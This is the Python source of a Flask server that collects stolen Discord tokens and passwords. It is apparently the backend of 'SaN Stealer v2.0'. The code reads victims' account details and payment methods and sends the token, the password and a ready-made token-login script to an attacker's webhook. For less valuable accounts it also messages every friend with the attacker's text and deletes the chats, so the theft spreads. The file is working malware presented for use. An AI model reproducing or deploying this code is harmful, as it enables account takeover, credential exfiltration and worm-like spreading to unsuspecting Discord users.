from distutils.log import debug
from urllib.request import Request, urlopen
from json import loads, dumps
from time import sleep
from threading import Thread
from flask import Flask
from waitress import serve
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

app = Flask(__name__)

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discord.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token))).read().decode())
    except Exception as e:
        print(e)
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except Exception as e:
        print(e)
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discord.com/api/v9/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except Exception as e:
        print(e)
        pass
def spread(token, form_data, delay):
    fs = getfriends(token)
    for friend in fs:
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
            requests.delete(f"https://discord.com/api/v9/channels/{chat_id}", headers=getheaders(token))
        except Exception as e:
            print(e)
            pass
        sleep(delay)
def send(token: str):
    data = {
        "content" : token,
        "username" : "Token Grabber"
    }
    requests.post("WEBHOOK LINK", json = data)
@app.route("/")
def home():
    return "home"
@app.route("/api/spread/<token>/<message>/<password>")
def API(token: str, message: str, password: str):
    PM = has_payment_methods(token)
    UI = getuserdata(token) # id, username, discriminator, email, phone
    message = message.replace("+", " ")
    try:
        if not UI["premium_type"] or UI["premium_type"] == 0:
            Nitro = "None"
        elif UI["premium_type"] == 1:
            Nitro = "Nitro Classic"
        elif UI["premium_type"] == 2:
            Nitro = "Nitro"
    except:
        Nitro = "None"
    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Early_Supporter = 512
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072

    Flags = UI["public_flags"]
    Badges = []

    if (Flags & Discord_Employee) == Discord_Employee:
        Badges.append("Discord Employee")
    if (Flags & Partnered_Server_Owner) == Partnered_Server_Owner:
        Badges.append("Partnered Server Owner")
    if (Flags & HypeSquad_Events) == HypeSquad_Events:
        Badges.append("HypeSquad Events")
    if (Flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1:
        Badges.append("Bug Hunter Level1")
    if (Flags & House_Bravery) == House_Bravery:
        Badges.append("House Bravery")
    if (Flags & House_Brilliance) == House_Brilliance:
        Badges.append("House Brilliance")
    if (Flags & House_Balance) == House_Balance:
        Badges.append("House Balance")
    if (Flags & Early_Supporter) == Early_Supporter:
        Badges.append("Early Supporter")
    if (Flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2:
        Badges.append("Bug Hunter Level2")
    if (Flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer:
        Badges.append("Early Verified Bot Developer")

    if PM is False and "Discord Employee" not in Badges and "Partnered Server Owner" not in Badges and "HypeSquad Events" not in Badges and "Bug Hunter Level1" not in Badges and "Early Supporter" not in Badges and "Bug Hunter Level2" not in Badges and "Early Verified Bot Developer" not in Badges:
        payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n {message}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\n{message}\n-----------------------------325414537030329320151394843687--'
        Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
        Autospread = "True"
    else:
        Autospread = "False"
    webhookk = DiscordWebhook(url="WEBHOOK LINK", rate_limit_retry=True)
    un = UI["username"] + "#" + UI['discriminator']
    embed = DiscordEmbed(title='SaN Stealer v2.0 | New Victim🔔 | @everyone', description=f':arrow_forward: **User:** `{un}`\n:moneybag: **Subscription**: `{Nitro}`', color='03b2f8')
    embed.add_embed_field(name="Payment Method:", value=str(PM))
    embed.add_embed_field(name="AutoSpread:", value=str(Autospread))
    embed.add_embed_field(name="Password:", value="`"+str(password)+'`')
    embed.add_embed_field(name="Badges:", value=str(Badges), inline=False)
    embed.add_embed_field(name="Token:", value=str(token), inline=False)
    embed.add_embed_field(name="Token Login Script", value='```let token="'+token+'";function login(e){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${e}"`},50),setTimeout(()=>{location.reload()},2500)}login(token);```', inline=False)
    webhookk.add_embed(embed)
    response = webhookk.execute()

    return "K"
    
serve(app=app, port=3000, threads=50)
